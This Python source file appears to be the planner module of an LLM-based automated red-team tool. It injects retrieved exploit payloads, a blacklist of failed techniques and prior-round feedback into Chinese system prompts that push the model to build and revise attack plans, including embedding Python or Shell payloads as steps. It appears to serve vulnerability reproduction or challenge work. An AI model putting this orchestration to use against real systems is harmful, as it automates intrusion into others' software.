                context_parts.append(f"    📦 Payload({name}){source_tag}: {payload[:500]}")
            elif cmd and cmd not in payload_seen:
                payload_seen.add(cmd)
                context_parts.append(f"    💻 命令{source_tag}: {cmd[:400]}")
            elif script and script not in payload_seen:
                payload_seen.add(script)
                # Scripts can be long; keep more but still cap
                context_parts.append(f"    📜 脚本({name}):\n{script[:800]}")
            else:
                # Fallback: just the content
                context_parts.append(f"    ▸ {item['content'][:300]}")

    if not context_parts:
        return ""

    # Assembled as a mandatory high-priority block
    body = "\n".join(context_parts)
    filter_note = ""
    if target_tags:
        filter_note = f"\n🔍 元数据过滤已启用 | target_tags: {', '.join(target_tags[:10])}"
    return f"""╔══════════════════════════════════════════════════════════════╗
║  🧠 长期记忆提取 — 强制参考（L1/L2/L3 ChromaDB 向量检索）  ║
╚══════════════════════════════════════════════════════════════╝
【⚠️ 你必须将以下经验整合进攻击计划中，不得无视！】{filter_note}

{body}

────────────────────────────────────────────────────────────
【使用说明】：
- L3 中的 Payload 和脚本已从历史经验库中向量匹配，与当前目标高度相关
- 如果 L3 提供了完整的 Python/Shell payload，直接将其核心逻辑嵌入 type="python" 或 type="shell" 步骤
- L2 中的失败教训是本系统积累的"避坑指南"，绝对禁止重蹈覆辙
- 如果某个 Payload 和当前目标的端点/参数/攻击面不匹配，应改编而非完全抛弃
────────────────────────────────────────────────────────────"""


def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
    vid = confirmed.get("vuln_id", "unknown")
    title = confirmed.get("title", "未命名漏洞")
    plan_id = f"mock-{vid}-1"

    os_info = platform.system()
    steps = [
        {
            "id": 1,
            "type": "shell",
            "command": f"echo Environment check on {os_info}",
            "purpose": f"环境自检({os_info})",
        },
        {
            "id": 2,
            "type": "shell",
            "command": f"echo Target: {title}",
            "purpose": "对齐漏洞上下文",
        },
    ]

    mem_stats = memory.get_stats()
    mem_context = _build_memory_context(memory, confirmed)
    steps.append(
        {
            "id": 3,
            "type": "python",
            "command": f'python -c "print(\'[mock] layered memory stats: {mem_stats}\')"',
            "purpose": "展示已加载长期记忆规模（演示）",
        }
    )

    return {
        "version": 1,
        "plan_id": plan_id,
        "vuln_summary": title,
        "rationale": "MOCK：未调用大模型。配置 DEEPSEEK_API_KEY 并关闭 CO_REDTEAM_MOCK_LLM 以生成真实计划。",
        "steps": steps,
        "raw_memory_chars": len(mem_context),
        "memory_stats": mem_stats,
        "platform": os_info,
    }


def _build_forbidden_techniques_block(feedback: dict[str, Any]) -> str:
    """从上一轮 feedback 的 strategy.add_failures 中提取"绝对禁止重用"的技术列表。

    当特工上一轮用了 %2523 双重编码报 404，本轮必须在此明确反思并彻底回避。
    返回一个高可见度的禁止块，直接拼入 system prompt。
    """
    memory_patch = feedback.get("memory_patch", {})
    strategy_patch = memory_patch.get("strategy", {})
    failures = strategy_patch.get("add_failures", [])
    if not failures:
        return ""

    lines: list[str] = []
    lines.append("╔══════════════════════════════════════════════════════════════╗")
    lines.append("║  🔴 失败指纹黑名单 — 绝对禁止重用以下已证伪的技术！      ║")
    lines.append("╚══════════════════════════════════════════════════════════════╝")
    lines.append("")
    lines.append("以下技术在上轮执行中已被证伪。你在本轮【绝对禁止】以任何形式复现：")
    lines.append("")

    for i, f in enumerate(failures, 1):
        step_id = f.get("step_id", "?")
        error = f.get("error", "未知错误")
        root_cause = f.get("root_cause", "")
        lines.append(f"  🚫 禁止项 #{i}（上轮 step {step_id} — {error}）")
        if root_cause:
            lines.append(f"     根因: {root_cause}")
        payload_text = f.get("payload", "")
        if payload_text:
            lines.append(f"     已证伪载荷: {payload_text[:200]}")

    lines.append("")
    lines.append("【强制反省要求】：")
    lines.append("  1. 在 rationale 中逐项列出上述禁止项，并说明本轮如何避免")
    lines.append("  2. 如果你在本轮生成了包含上述载荷的 step，你的计划将被直接拒绝")
    lines.append("  3. 如果某个禁止项是本轮成功的关键，你必须设计全新的替代方案")
    lines.append("  4. 若前序步骤（如获取 token）本身未完成，严禁构造依赖它的后续步骤")
    lines.append("")

    # Also extract bypass-level failures from patterns
    pattern_patch = memory_patch.get("pattern", {})
    failed_patterns = pattern_patch.get("add_patterns", [])
    if failed_patterns:
        lines.append("【已证伪的 bypass 模式】:")
        for fp in failed_patterns:
            fp_id = fp.get("id", "?")
            fp_type = fp.get("type", "?")
            fp_payload = fp.get("payload", "")
            fp_desc = fp.get("description", "")
            lines.append(f"  ❌ [{fp_type}] {fp_desc}: {fp_payload}")

    lines.append("")
    lines.append("╚══════════════════════════════════════════════════════════════╝")

    return "\n".join(lines)


def run_planner(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None,
    out_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    if settings.mock_llm or llm is None:
        plan = _mock_plan(confirmed, memory)
        if feedback:
            plan["prior_feedback"] = feedback
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""

    # 🔑 RAG 检索：按 CWE + 漏洞描述 + 上轮报错精准匹配三层记忆
    memory_context = _build_memory_context(memory, confirmed, feedback)

    user = {
        "confirmed_vuln": confirmed,
        "layered_memory": json.loads(memory.planning_context()),
        "retrieved_experience": memory_context,
        "prior_feedback": feedback,
    }

    system_prompt_with_memory = build_dynamic_prompt(confirmed, adapter=adapter)

    if system_prompt_with_memory.startswith("【严重配置错误】"):
        print(f"[planner] ⚠️ {system_prompt_with_memory}")
        plan = {
            "version": 1,
            "plan_id": "plan_config_error",
            "vuln_summary": "CONFIG_ERROR",
            "rationale": system_prompt_with_memory,
            "steps": [],
            "error": "config",
            "platform": platform.system(),
        }
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    # 🔑 失败指纹黑名单 — 前置注入，防幻觉复现
    forbidden_block = ""
    if feedback:
        forbidden_block = _build_forbidden_techniques_block(feedback)
        if forbidden_block:
            system_prompt_with_memory = (
                forbidden_block + "\n\n" + system_prompt_with_memory
            )
            print(f"[planner] 🚫 失败指纹黑名单已注入（{len(forbidden_block)} chars）")

    # 🔑 长期记忆作为独立高权重模块，前置拼接到 System Prompt（确保 LLM 不会无视）
    if memory_context:
        system_prompt_with_memory = (
            memory_context + "\n\n" + system_prompt_with_memory
        )
        print(f"[planner] 🧠 长期记忆已注入 system prompt（{len(memory_context)} chars）")

    if feedback:
        fb_planner = feedback.get("feedback_for_planner", "")
        fb_summary = feedback.get("summary", "")
        fb_confidence = feedback.get("confidence", 0)
        fb_success = feedback.get("repro_success", False)
        fb_errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        fb_parts = [
            f"confidence={fb_confidence} | repro_success={fb_success}",
        ]
        if fb_summary:
            fb_parts.append(f"summary: {fb_summary}")
        if fb_planner:
            fb_parts.append(f"feedback: {fb_planner}")
        if fb_errors:
            fb_parts.append(f"errors: {'; '.join(str(e) for e in fb_errors)}")

        # 🔑 前轮 history_state 注入：强制 Planner 感知已尝试的 payload 历史
        prior_history = feedback.get("prior_history_state")
        if prior_history and isinstance(prior_history, dict):
            tried = prior_history.get("tried_payloads", [])
            failed = prior_history.get("failed_reasons", [])
            cat_fails = prior_history.get("consecutive_failures_per_category", {})
            history_lines = []
            if tried:
                history_lines.append(f"  🚫 已尝试的 Payload（严禁重复！）: {', '.join(tried)}")
            if failed:
                history_lines.append(f"  ❌ 历史失败原因: {'; '.join(failed)}")
            if cat_fails:
                cat_str = ", ".join(f"{k}={v}次" for k, v in cat_fails.items())
                history_lines.append(f"  📊 分类失败计数: {cat_str}")
                over_threshold = [k for k, v in cat_fails.items() if v >= 3]
                if over_threshold:
                    history_lines.append(
                        f"  ⛔ 以下攻击路径已达失败上限，强制切换: {', '.join(over_threshold)}"
                    )
            if history_lines:
                fb_parts.append("history_state:\n" + "\n".join(history_lines))

        system_prompt_with_memory += (
            "\n\n"
            "══════════════════════════════════════════\n"
            "【🔴 上一轮执行反馈 — 必须阅读并修正！】\n"
            "══════════════════════════════════════════\n"
            + "\n".join(f"  • {p}" for p in fb_parts)
            + "\n\n⚠️ 请根据以上反馈修正你的攻击计划。如果反馈指出 URL 错误、payload 格式错误或参数问题，必须在这一轮计划中修复！\n"
            "══════════════════════════════════════════\n"
        )

    plan = llm.complete_json(
        system_prompt_with_memory,
        json.dumps(user, ensure_ascii=False),
    )
    plan.setdefault("version", 1)
    plan["platform"] = platform.system()
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
    return plan
